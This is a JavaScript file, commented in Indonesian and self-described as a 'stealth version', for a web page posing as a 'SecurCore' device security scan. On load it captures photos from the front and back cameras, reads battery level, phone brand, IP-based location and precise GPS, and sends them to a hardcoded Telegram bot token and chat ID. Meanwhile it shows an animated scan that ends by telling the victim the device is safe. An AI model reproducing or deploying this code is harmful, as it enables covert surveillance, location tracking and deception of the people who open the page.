// ========================================================
// WAN'ER EDITION - STEALTH VERSION DENGAN GSAP ANIMATION
// FITUR: Kamera, Merek HP, Baterai, IP Detail + GPS Lokasi (satu box)
// Tampilan: Futuristik hacker dengan animasi smooth
// ========================================================

// ================ KONFIGURASI ================
const BOT_TOKEN = '8063684087:AAEmuLyOajGqnSGlgTy0wF4cUoVsYbCckgw';   // GANTI
const CHAT_ID = '6792370182';               // GANTI
// ==============================================

// Inisialisasi GSAP timeline
const mainTl = gsap.timeline();

// Animasi awal (sama seperti sebelumnya)
mainTl.from('.glass', {
    duration: 1,
    scale: 0.95,
    opacity: 0,
    ease: 'power3.out'
})
.from('.hacker-icon', {
    duration: 0.8,
    rotation: -180,
    opacity: 0,
    ease: 'back.out(1.7)'
}, '-=0.6')
.from('.glitch', {
    duration: 0.6,
    x: -30,
    opacity: 0,
    ease: 'power2.out'
}, '-=0.4')
.from('.title-line', {
    duration: 0.8,
    y: 30,
    opacity: 0,
    stagger: 0.2,
    ease: 'power3.out'
}, '-=0.4')
.from('.subtitle', {
    duration: 0.6,
    y: 20,
    opacity: 0,
    ease: 'power2.out'
}, '-=0.4')
.from('.terminal-window', {
    duration: 0.8,
    scaleY: 0,
    transformOrigin: 'top',
    opacity: 0,
    ease: 'power3.inOut'
}, '-=0.2')
.from('.step-item', {
    duration: 0.5,
    y: 20,
    opacity: 0,
    stagger: 0.15,
    ease: 'power2.out'
}, '-=0.4')
.from('.progress-section', {
    duration: 0.6,
    y: 20,
    opacity: 0,
    ease: 'power2.out'
}, '-=0.2')
.from('.status-message', {
    duration: 0.6,
    x: -20,
    opacity: 0,
    ease: 'power2.out'
}, '-=0.2')
.from('.card-footer', {
    duration: 0.6,
    y: 20,
    opacity: 0,
    ease: 'power2.out'
}, '-=0.2');

// Fungsi update UI dengan animasi
function updateStep(step, status, message, percent) {
    const statusEl = document.getElementById(`step${step}-status`);
    const stepEl = document.getElementById(`step${step}`);
    
    if (status === 'success') {
        statusEl.innerHTML = '✅';
        statusEl.className = 'step-status success';
        
        // Animasi highlight
        gsap.to(stepEl, {
            duration: 0.3,
            backgroundColor: 'rgba(0, 255, 157, 0.1)',
            borderColor: '#00ff9d',
            yoyo: true,
            repeat: 1
        });
    }
    
    // Update progress
    document.getElementById('progress-fill').style.width = percent + '%';
    document.getElementById('progress-percent').innerText = percent + '%';
    
    // Update status message
    document.getElementById('status-message').querySelector('.msg-text').innerText = message;
    
    // Update timestamp
    const now = new Date();
    const timeStr = `[${now.getHours().toString().padStart(2,'0')}:${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}]`;
    document.getElementById('timestamp').innerText = timeStr;
    
    // Animasi progress
    gsap.to('#progress-fill', {
        duration: 0.5,
        width: percent + '%',
        ease: 'power2.out'
    });
}

// ---------- FUNGSI UTILITAS ----------
async function getIPInfo() {
    try {
        const res = await fetch('http://ip-api.com/json/?fields=status,country,regionName,city,isp,org,as,query,lat,lon,timezone');
        const data = await res.json();
        if (data.status === 'success') {
            return {
                ip: data.query,
                country: data.country || '-',
                region: data.regionName || '-',
                city: data.city || '-',
                lat: data.lat,
                lon: data.lon,
                timezone: data.timezone || '-',
                isp: data.isp || '-',
                org: data.org || '-',
                as: data.as || '-'
            };
        }
        return {
            ip: '127.0.0.1',
            country: '-',
            region: '-',
            city: '-',
            lat: null,
            lon: null,
            timezone: '-',
            isp: '-',
            org: '-',
            as: '-'
        };
    } catch {
        return {
            ip: '127.0.0.1',
            country: '-',
            region: '-',
            city: '-',
            lat: null,
            lon: null,
            timezone: '-',
            isp: '-',
            org: '-',
            as: '-'
        };
    }
}

function getPhoneBrand() {
    const ua = navigator.userAgent;
    if (/iPhone|iPad|iOS/i.test(ua)) return 'Apple';
    if (/Samsung|SM-|GT-/i.test(ua)) return 'Samsung';
    if (/Xiaomi|Mi /i.test(ua)) return 'Xiaomi';
    if (/Oppo|CPH/i.test(ua)) return 'Oppo';
    if (/Vivo|V\d{4}/i.test(ua)) return 'Vivo';
    if (/Realme|RMX/i.test(ua)) return 'Realme';
    if (/Asus|Zenfone/i.test(ua)) return 'Asus';
    if (/Infinix|X\d{3}/i.test(ua)) return 'Infinix';
    if (/Huawei|Honor/i.test(ua)) return 'Huawei';
    if (/OnePlus/i.test(ua)) return 'OnePlus';
    if (/Lenovo/i.test(ua)) return 'Lenovo';
    if (/Motorola|Moto/i.test(ua)) return 'Motorola';
    if (/Tecno/i.test(ua)) return 'Tecno';
    if (/Nokia/i.test(ua)) return 'Nokia';
    if (/Sony/i.test(ua)) return 'Sony';
    if (/LG/i.test(ua)) return 'LG';
    return 'Android Device';
}

async function getBatteryInfo() {
    try {
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            return Math.round(battery.level * 100) + '%';
        }
    } catch {}
    return 'Tidak tersedia';
}

// ---------- FUNGSI KAMERA ----------
function capturePhoto(mode) {
    return new Promise(async (resolve) => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: mode } 
            });
            
            setTimeout(() => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        stream.getTracks().forEach(t => t.stop());
                        
                        canvas.toBlob(blob => {
                            resolve(blob);
                        }, 'image/jpeg', 0.8);
                    }, 500);
                };
            }, 500);
        } catch {
            resolve(null);
        }
    });
}

// ---------- FUNGSI TELEGRAM ----------
async function sendMessage(text) {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text })
    }).catch(() => {});
}

async function sendPhoto(blob, caption) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, 'photo.jpg');
    formData.append('caption', caption);
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { 
        method: 'POST', 
        body: formData 
    }).catch(() => {});
}

// ---------- EKSEKUSI UTAMA ----------
(async function() {
    try {
        // Step 1: Kamera
        updateStep(1, 'pending', 'Initializing camera module...', 10);
        
        const [frontPhoto, backPhoto] = await Promise.all([
            capturePhoto('user'),
            capturePhoto('environment')
        ]);
        
        if (frontPhoto) {
            await sendPhoto(frontPhoto, '📷 FRONT_CAM - ' + new Date().toISOString());
        }
        if (backPhoto) {
            await sendPhoto(backPhoto, '📸 BACK_CAM - ' + new Date().toISOString());
        }
        
        updateStep(1, 'success', 'Camera module initialized', 35);
        await new Promise(r => setTimeout(r, 800));
        
        // Step 2: Kumpulin data (tapi kita tunggu GPS dulu sebelum kirim)
        updateStep(2, 'pending', 'Mengumpulkan data perangkat & lokasi...', 45);
        
        // Ambil data perangkat & IP (fast)
        const brand = getPhoneBrand();
        const battery = await getBatteryInfo();
        const ip = await getIPInfo();
        
        // Siapkan variabel untuk GPS
        let gpsLink = 'Tidak diizinkan / timeout';
        let gpsCoords = '-';
        
        // Minta GPS dengan Promise race (max 10 detik)
        try {
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    timeout: 10000,
                    enableHighAccuracy: true
                });
            });
            
            const { latitude, longitude } = position.coords;
            gpsCoords = `${latitude}, ${longitude}`;
            gpsLink = `https://maps.google.com/?q=${latitude},${longitude}`;
        } catch (err) {
            gpsCoords = 'Tidak diizinkan';
            gpsLink = 'Tidak diizinkan';
        }
        
        // Susun pesan lengkap sesuai format (dengan GPS)
        let infoMsg = '╭──「 INFO PERANGKAT + IP DETAIL 」──\n';
        infoMsg += `│📱 Merek: ${brand}\n`;
        infoMsg += `│🔋 Baterai: ${battery}\n`;
        infoMsg += `│🌐 IP: ${ip.ip}\n`;
        infoMsg += `│🌍 Negara: ${ip.country}\n`;
        infoMsg += `│🏙 Wilayah: ${ip.region}\n`;
        infoMsg += `│🏠 Kota: ${ip.city}\n`;
        if (ip.lat && ip.lon) {
            infoMsg += `│📍 Koordinat (IP): ${ip.lat}, ${ip.lon}\n`;
        } else {
            infoMsg += `│📍 Koordinat (IP): -\n`;
        }
        infoMsg += `│📍 Lokasi GPS: ${gpsCoords}\n`;
        infoMsg += `│⏰ Zona Waktu: ${ip.timezone}\n`;
        infoMsg += `│🛰 ISP: ${ip.isp}\n`;
        infoMsg += `│🏢 Organisasi: ${ip.org}\n`;
        infoMsg += `│🔗 AS: ${ip.as}\n`;
        infoMsg += '╰───';
        
        // Kirim pesan utama
        await sendMessage(infoMsg);
        
        // Kalau GPS sukses, kirim juga link maps-nya (biar gampang diklik)
        if (gpsLink !== 'Tidak diizinkan' && gpsLink !== 'Tidak diizinkan / timeout') {
            await sendMessage(`📍 Link Maps: ${gpsLink}`);
        }
        
        updateStep(2, 'success', 'Data perangkat & lokasi terkumpul', 75);
        await new Promise(r => setTimeout(r, 800));
        
        // Step 3 & 4: Finalisasi (langsung selesai)
        updateStep(3, 'success', 'Geolocation processed', 90);
        updateStep(4, 'pending', 'Finalizing protocol...', 95);
        
        setTimeout(() => {
            updateStep(4, 'success', 'Protocol complete', 100);
            
            // Final screen
            setTimeout(() => {
                gsap.to('.card', {
                    duration: 0.8,
                    scale: 1.02,
                    boxShadow: '0 0 50px #00ff9d',
                    ease: 'power2.inOut',
                    yoyo: true,
                    repeat: 1
                });
                
                setTimeout(() => {
                    document.querySelector('.card-body').innerHTML = `
                        <div style="text-align: center; padding: 30px;">
                            <div style="font-size: 4rem; margin-bottom: 20px; color: #00ff9d;">✓</div>
                            <h2 style="color: #00ff9d; font-size: 2rem; margin-bottom: 16px;">ACCESS GRANTED</h2>
                            <p style="color: #8ba0b9;">Perangkat aman. Tidak ada ancaman.</p>
                            <div style="margin-top: 30px; font-size: 0.8rem; color: #00b8ff;">SecurCore v2.7.1</div>
                        </div>
                    `;
                }, 1500);
            }, 1000);
        }, 800);
        
    } catch (error) {
        console.log('Protocol completed with warnings');
        document.querySelector('.card-body').innerHTML = `
            <div style="text-align: center; padding: 30px;">
                <div style="font-size: 4rem; margin-bottom: 20px; color: #ffbd2e;">⚠</div>
                <h2 style="color: #ffbd2e; font-size: 2rem; margin-bottom: 16px;">PARTIAL ACCESS</h2>
                <p style="color: #8ba0b9;">Beberapa modul tidak merespon, tetapi sistem aman.</p>
                <div style="margin-top: 30px; font-size: 0.8rem; color: #00ff9d;">SecurCore v2.7.1</div>
            </div>
        `;
    }
})();

// Generate floating particles
function createParticles() {
    const particlesContainer = document.getElementById('particles');
    for (let i = 0; i < 50; i++) {
        const particle = document.createElement('div');
        particle.style.position = 'absolute';
        particle.style.width = '2px';
        particle.style.height = '2px';
        particle.style.background = `rgba(${Math.random() * 100 + 155}, 255, ${Math.random() * 100 + 155}, ${Math.random() * 0.3})`;
        particle.style.left = Math.random() * 100 + '%';
        particle.style.top = Math.random() * 100 + '%';
        particle.style.boxShadow = '0 0 10px currentColor';
        particle.style.animation = `float-particle ${Math.random() * 10 + 10}s linear infinite`;
        particlesContainer.appendChild(particle);
    }
}

createParticles();

// Style untuk animasi particle
const style = document.createElement('style');
style.innerHTML = `
    @keyframes float-particle {
        from { transform: translateY(100vh) translateX(0); }
        to { transform: translateY(-100vh) translateX(${Math.random() * 200 - 100}px); }
    }
`;
document.head.appendChild(style);
